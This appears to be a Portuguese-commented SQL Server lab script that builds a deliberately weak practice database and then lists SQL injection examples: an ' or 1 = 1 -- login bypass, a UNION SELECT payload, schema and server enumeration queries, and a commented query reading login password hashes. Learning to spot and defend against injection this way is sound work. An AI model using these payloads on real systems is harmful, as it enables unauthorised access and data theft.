use master
go
IF  EXISTS (SELECT name FROM sys.databases WHERE name = 'db_testSqlInjection')
	BEGIN
		ALTER DATABASE db_testSqlInjection SET SINGLE_USER WITH ROLLBACK IMMEDIATE
		DROP DATABASE db_testSqlInjection
	END
go
create database db_testSqlInjection	
go
use db_testSqlInjection
go
create table products (
	name VARCHAR(50) PRIMARY KEY,
	price SMALLMONEY,
	quantity INT	
)
GO
insert into products values	 ('Teclado Logitec', 50, 10)
							,('Mouse Logitec', 250, 6)
							,('Pendriver 64gb Sandisk', 90, 4)
							,('Pendriver 32gb Sandisk', 55, 7)
							,('Notebook Dell Inspiron 15 7000', 3500, 2)
							,('Carro do Batman', 214748, 2)

GO
create table users (
	uname	VARCHAR(30) PRIMARY KEY,
	pass	VARCHAR(12),
	cc		VARCHAR(50),
	adress	VARCHAR(50),
	email	VARCHAR(50),
	name	VARCHAR(50),
	phone	VARCHAR(50)	
)
GO
insert into users (uname, pass, cc, name)	
					values	('bob',		'abc1234', '5142574859364124',  'Bob Dylan')
				           ,('mike',	'123456',  '21684981561894664', 'Mikentosh Mac')
						   ,('caio',	'admin',   '1651258196165145',  'Caio Souza')

GO
 CREATE PROCEDURE sp_inserirUsuario
	@uname	VARCHAR(30),
	@pass	VARCHAR(12),
	@cc		VARCHAR(50),
	@adress	VARCHAR(50),
	@email	VARCHAR(50),
	@name	VARCHAR(50),
	@phone	VARCHAR(50)
	AS
		INSERT INTO users values (@uname, @pass, @cc, @adress, @email, @name, @phone)

GO
EXEC sp_inserirUsuario 'joca','abcdef','5648415891815',null,'jk@gmail.com', 'Joca Amilton', null


RETURN
--SqlInjection Exemplos

--TEXTBOX:
--	' or 1 = 1 -- 
--RESULTADO:
	SELECT * from users where uname='' or 1 = 1 --' and senha='abc123456');

--TEXTBOX:
--	' union SELECT DB_NAME(), 99 --
--RESULTADO:	
	SELECT name AS 'Produto', price as 'Preço' from products WHERE name LIKE  '%' union SELECT DB_NAME(), 99 --%'


select @@VERSION

--busca o banco atual rodando
SELECT DB_NAME() AS [Current Database];

--busca usuario do banco 
SELECT SUSER_NAME() as Usuario
--OU 
--SUSER_SNAME()
--SYSTEM_USER 

--busca de todos banco do sistema
SELECT name, database_id, create_date FROM sys.databases

--busca o nome do servidor rodando o banco
SELECT @@SERVERNAME AS 'SERVIDOR'
--OU
--HOST_NAME();

--buscar todas tabelas do banco rodando atual
SELECT table_name FROM INFORMATION_SCHEMA.TABLES

--buscando nome das colunas
SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS

--buscando stored procedures
SELECT SPECIFIC_CATALOG, ROUTINE_NAME, ROUTINE_DEFINITION  from db_testSqlInjection.information_schema.routines  where routine_type = 'PROCEDURE'
--ou 
SELECT * FROM sys.procedures

--buscando triggers
SELECT  sysobjects.name AS trigger_name, OBJECT_NAME(parent_obj) AS table_name, OBJECT_DEFINITION(id) AS trigger_definition FROM sysobjects WHERE sysobjects.type = 'TR' 

--buscando mais objetos como PKS, tabelas
SELECT name, type  FROM sys.sysobjects -- WHERE type = 'P'

--outras info 
SELECT * FROM sys.server_principals
 

--SELECT name, password, LOGINPROPERTY(name, 'PasswordHash' ) hash
--FROM sys.syslogins
--WHERE password IS NOT NULL
--ORDER BY name
